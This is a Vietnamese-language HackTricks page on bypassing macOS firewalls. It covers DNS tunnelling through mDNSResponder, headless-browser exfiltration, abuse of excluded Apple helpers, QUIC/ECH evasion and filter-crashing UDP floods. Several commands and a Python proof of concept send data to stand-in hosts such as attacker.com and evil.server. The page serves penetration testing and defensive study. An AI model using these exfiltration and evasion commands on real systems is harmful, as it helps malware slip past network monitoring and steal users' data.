# Bỏ qua firewall trên macOS

{{#include ../../banners/hacktricks-training.md}}

## Các kỹ thuật đã tìm thấy

Các kỹ thuật sau đây đã được phát hiện là có hiệu quả với một số ứng dụng firewall trên macOS.

### Lạm dụng tên trong whitelist

- Ví dụ: đặt tên malware theo tên các tiến trình macOS phổ biến như **`launchd`**

### Synthetic Click

- Nếu firewall yêu cầu người dùng cấp quyền, hãy khiến malware **nhấp vào nút cho phép**

### **Sử dụng binary được Apple ký**

- Chẳng hạn như **`curl`**, ngoài ra còn có các binary khác như **`whois`**

### Các domain phổ biến của Apple

Firewall có thể cho phép kết nối đến các domain phổ biến của Apple như **`apple.com`** hoặc **`icloud.com`**. iCloud cũng có thể được dùng làm C2.

### Bỏ qua tổng quát

Một số ý tưởng để thử bỏ qua firewall

### Kiểm tra lưu lượng được cho phép

Biết lưu lượng nào được cho phép sẽ giúp bạn xác định các domain có thể nằm trong whitelist hoặc những ứng dụng được phép truy cập các domain đó

```bash
lsof -i TCP -sTCP:ESTABLISHED
```

### Lạm dụng DNS

Trên macOS, một tiến trình **không** tự giao tiếp với máy chủ DNS. Việc phân giải tên được **`mDNSResponder`** (`/usr/sbin/mDNSResponder`), một daemon hệ thống do Apple ký, trung gian qua **XPC**, vì vậy mọi truy vấn trên máy đều rời khỏi máy dưới dạng lưu lượng **từ `mDNSResponder`**, thay vì từ tiến trình khởi tạo truy vấn. Do đó, firewall thường tin cậy daemon này vô điều kiện — chặn nó sẽ làm hỏng việc phân giải tên trên toàn hệ thống.<sup>[[1]](#references)</sup>

Điều đó biến DNS thành một kênh vẫn hoạt động ngay cả khi firewall chặn các socket của chính malware:<sup>[[1]](#references)</sup>

1. Malware cố kết nối đến `evil.com`. Kết nối outbound **của chính nó** bị firewall kiểm tra và **chặn**.
2. Thay vào đó, malware yêu cầu `mDNSResponder` **phân giải** `evil.com` qua XPC.
3. Firewall kiểm tra truy vấn được tạo ra, thấy resolver đáng tin cậy có chữ ký Apple là nguồn gửi và **cho phép** truy vấn.
4. Truy vấn đến máy chủ DNS — và nếu attacker vận hành máy chủ authoritative cho `evil.com`, họ kiểm soát cả hai đầu của quá trình trao đổi.

Vì attacker sở hữu zone đó, không cần thiết lập “kết nối”: dữ liệu được tuồn ra bên trong **các nhãn được truy vấn** (ví dụ: `<encoded-chunk>.evil.com`), còn lệnh được gửi về bên trong **các bản ghi trả lời** (TXT, A, CNAME…), tạo thành kỹ thuật DNS tunnelling cổ điển thông qua một tiến trình được whitelist hoàn toàn.

Bất kỳ tiến trình không có đặc quyền nào cũng có thể trực tiếp điều khiển daemon, đây là cách dễ dàng để xác nhận kênh này vẫn mở:

```bash
# resolution is performed by mDNSResponder on the caller's behalf
dns-sd -G v4v6 evil.com
```

### Thông qua ứng dụng trình duyệt

- **oascript**

```applescript
tell application "Safari"
    run
    tell application "Finder" to set visible of process "Safari" to false
    make new document
    set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```

- Google Chrome

```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```

- Firefox

```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```

- Safari

```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```

### Thông qua process injection

Nếu bạn có thể **inject code vào một process** được phép kết nối đến bất kỳ máy chủ nào, bạn có thể bypass các biện pháp bảo vệ của firewall:

{{#ref}}
macos-proces-abuse/
{{#endref}}

---

## Các lỗ hổng bypass firewall macOS gần đây (2023-2025)

### Bypass Web content filter (Screen Time) – **CVE-2024-44206**
Vào tháng 7 năm 2024, Apple đã vá một lỗi nghiêm trọng trong Safari/WebKit khiến “Web content filter” trên toàn hệ thống, được Screen Time sử dụng để kiểm soát của phụ huynh, bị vô hiệu hóa.

Một URI được tạo đặc biệt (ví dụ: chứa “://” được mã hóa URL hai lần) không được Screen Time ACL nhận diện nhưng lại được WebKit chấp nhận, khiến yêu cầu được gửi đi mà không qua bộ lọc. Vì vậy, bất kỳ process nào có thể mở URL (bao gồm cả code chạy trong sandbox hoặc chưa được ký) đều có thể truy cập các domain bị người dùng hoặc hồ sơ MDM chặn rõ ràng.<sup>[[2]](#references)</sup>

Kiểm tra thực tế (trên hệ thống chưa được vá):

```bash
open "http://attacker%2Ecom%2F./"   # should be blocked by Screen Time
# if the patch is missing Safari will happily load the page
```

### Lỗi sắp xếp thứ tự rule của Packet Filter (PF) trong macOS 14 “Sonoma” bản đầu
Trong chu kỳ beta của macOS 14, Apple đã đưa vào một regression trong wrapper userspace của **`pfctl`**.
Các rule được thêm với từ khóa `quick` (được nhiều VPN kill-switch sử dụng) đã bị bỏ qua âm thầm, gây ra traffic leak ngay cả khi GUI của VPN/firewall hiển thị *blocked*. Lỗi này đã được một số nhà cung cấp VPN xác nhận và được khắc phục trong RC 2 (build 23A344).<sup>[[6]](#references)</sup>

Kiểm tra leak nhanh:

```bash
pfctl -sr | grep quick       # rules are present…
sudo tcpdump -n -i en0 not port 53   # …but packets still leave the interface
```

### Lạm dụng các dịch vụ trợ giúp có chữ ký Apple (legacy – trước macOS 11.2)
Trước macOS 11.2, **`ContentFilterExclusionList`** cho phép khoảng 50 binary của Apple, chẳng hạn như **`nsurlsessiond`** và App Store, bypass mọi firewall lọc socket được triển khai bằng framework Network Extension (LuLu, Little Snitch, v.v.).
Malware chỉ cần spawn một tiến trình nằm trong danh sách loại trừ—hoặc inject code vào đó—rồi tunnel lưu lượng của chính nó qua socket đã được cho phép. Apple đã loại bỏ hoàn toàn danh sách loại trừ trong macOS 11.2, nhưng kỹ thuật này vẫn hữu ích trên các hệ thống không thể nâng cấp.<sup>[[3]](#references)</sup>

Ví dụ proof-of-concept (trước 11.2):

```python
import subprocess, socket
# Launch excluded App Store helper (path collapsed for clarity)
subprocess.Popen(['/System/Applications/App\\ Store.app/Contents/MacOS/App Store'])
# Connect through the inherited socket
s = socket.create_connection(("evil.server", 443))
s.send(b"exfil...")
```

### Dùng QUIC/ECH để né bộ lọc domain của Network Extension (macOS 12+)
NEFilter Packet/Data Providers dựa vào SNI/ALPN trong TLS ClientHello. Với **HTTP/3 qua QUIC (UDP/443)** và **Encrypted Client Hello (ECH)**, SNI vẫn được mã hóa, NetExt không thể phân tích luồng và các quy tắc hostname thường chuyển sang fail-open, cho phép malware truy cập các domain bị chặn mà không cần truy vấn DNS.<sup>[[5]](#references)</sup>

PoC tối giản:

```bash
# Chrome/Edge – force HTTP/3 and ECH
/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome \
  --enable-quic --origin-to-force-quic-on=attacker.com:443 \
  --enable-features=EncryptedClientHello --user-data-dir=/tmp/h3test \
  https://attacker.com/payload

# cURL 8.10+ built with quiche
curl --http3-only https://attacker.com/payload
```

Nếu QUIC/ECH vẫn được bật, đây là cách dễ dàng để né bộ lọc hostname.

### Sự bất ổn của Network Extension trên macOS 15 “Sequoia” (2024–2025)
Các bản dựng 15.0/15.1 ban đầu khiến các bộ lọc **Network Extension** của bên thứ ba gặp sự cố (LuLu, Little Snitch, Defender, SentinelOne, v.v.). Khi bộ lọc khởi động lại, macOS xóa các quy tắc flow và nhiều sản phẩm chuyển sang chế độ fail-open. Việc làm ngập bộ lọc bằng hàng nghìn flow UDP ngắn (hoặc buộc dùng QUIC/ECH) có thể liên tục kích hoạt sự cố và tạo ra một khoảng thời gian cho C2/exfil trong khi giao diện GUI vẫn báo rằng firewall đang chạy.<sup>[[4]](#references)</sup>

Cách tái hiện nhanh (trên máy lab an toàn):

```bash
# create many short UDP flows to exhaust NE filter queues
python3 - <<'PY'
import socket, os
for i in range(5000):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.sendto(b'X'*32, ('1.1.1.1', 53))
PY
# watch for NetExt crash / reconnect loop
log stream --predicate 'subsystem == "com.apple.networkextension"' --style syslog
```

---

## Mẹo sử dụng công cụ trên macOS hiện đại

1. Kiểm tra các quy tắc PF hiện tại do firewall GUI tạo ra:
   ```bash
   sudo pfctl -a com.apple/250.ApplicationFirewall -sr
   ```
2. Liệt kê các binary đã có entitlement *outgoing-network* (hữu ích để piggy-backing):
   ```bash
   codesign -d --entitlements :- /path/to/bin 2>/dev/null \
       | plutil -extract com.apple.security.network.client xml1 -o - -
   ```
3. Đăng ký bộ lọc nội dung Network Extension của riêng bạn bằng Objective-C/Swift theo cách lập trình.  
   Mã PoC rootless tối thiểu chuyển tiếp các gói tin đến một socket cục bộ có trong mã nguồn **LuLu** của Patrick Wardle.

## References

- [1] [DEF CON 26 - Patrick Wardle - Fire & Ice: Tạo dựng và phá vỡ firewall macOS](https://www.youtube.com/watch?v=UlT5KFTMn2k)
- [2] [Lỗ hổng bypass bộ lọc nội dung web của Apple cho phép truy cập không hạn chế vào nội dung bị chặn (CVE-2024-44206) - Nosebeard Labs](https://nosebeard.co/advisories/nbl-001.html)
- [3] [Apple gỡ bỏ tính năng macOS cho phép ứng dụng bypass bảo mật firewall - The Hacker News](https://thehackernews.com/2021/01/apple-removes-macos-feature-that.html)
- [4] [Các sản phẩm an ninh mạng ngừng hoạt động sau bản cập nhật macOS Sequoia - SecurityWeek](https://www.securityweek.com/cybersecurity-products-conking-out-after-macos-sequoia-update/)
- [5] [Sử dụng bảo vệ mạng để giúp ngăn macOS kết nối đến các trang web độc hại - Microsoft Defender for Endpoint | Microsoft Learn](https://learn.microsoft.com/en-us/defender-endpoint/network-protection-macos)
- [6] [Đã sửa lỗi firewall macOS 14 Sonoma! - Mullvad VPN Blog](https://mullvad.net/en/blog/2023/9/22/macos-14-sonoma-firewall-bug-fixed)
{{#include ../../banners/hacktricks-training.md}}
